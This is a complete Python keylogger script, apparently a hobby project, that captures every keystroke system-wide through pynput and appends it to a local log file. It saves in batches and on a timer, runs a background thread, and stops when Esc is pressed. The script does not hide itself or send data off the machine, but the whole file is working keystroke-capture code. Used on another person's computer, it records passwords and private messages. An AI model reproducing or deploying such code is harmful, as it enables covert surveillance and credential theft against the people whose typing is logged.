from pynput.keyboard import Key, Listener
import os
import time
import threading
from colorama import init, Fore

# Initialize colorama
init(autoreset=True)

# File to store keystrokes
file_path = "D:\\Python Projects\\keylogger project\\project"  # Update to your desired path
key_information = "key_log.txt"
full_file_path = os.path.join(file_path, key_information)

# Create the directory if it doesn't exist
os.makedirs(file_path, exist_ok=True)

# Variables for keystroke logging
count = 0
keys = []
save_interval = 10  # Save keystrokes after every 10 key presses
last_saved = time.time()  # Track time for periodic saving

# Function to map special keys to a more readable format
def map_special_keys(key):
    if key == Key.space:
        return " "  # Just return a space for the 'space' key
    elif key == Key.enter:
        return "\n"  # Return a newline for the 'enter'
    elif key == Key.tab:
        return "\t"  # Tab key
    elif key == Key.backspace:
        return "[BACKSPACE]"  # Explicitly indicate backspace
    elif key == Key.esc:
        return "[ESC]"  # ESC key
    elif "Key" in str(key):
        return f"[{str(key).replace('Key.', '')}]"  # Other special keys
    else:
        return str(key).replace("'", "")  # Clean up any quotes around regular keys

# Function to handle the writing of keys to the log file
def write_file(keys):
    try:
        with open(full_file_path, "a") as f:
            for key in keys:
                f.write(map_special_keys(key))  # Write mapped keys without quotes
        print(Fore.GREEN + f"Logged {len(keys)} keystrokes.")
    except Exception as e:
        print(Fore.RED + f"Error writing to file: {e}")

# Function to save logs periodically (asynchronously)
def periodic_save():
    global keys, last_saved
    while True:
        if time.time() - last_saved >= 60:  # Save every minute
            if keys:
                write_file(keys)
                keys = []  # Clear the current batch of keys
            last_saved = time.time()
        time.sleep(5)

# Keypress detection
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1

    if count >= save_interval:  # Save after the set interval
        count = 0
        write_file(keys)
        keys = []

# Key release detection
def on_release(key):
    if key == Key.esc:
        # Save any remaining keys before exiting
        if keys:
            write_file(keys)
        print(Fore.YELLOW + "Keylogger stopped.")
        return False

# Start periodic save in a separate thread
save_thread = threading.Thread(target=periodic_save)
save_thread.daemon = True  # Allow it to run in the background
save_thread.start()

# Listener to capture keystrokes
print(Fore.CYAN + "Keylogger started... Press 'Esc' to stop.")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


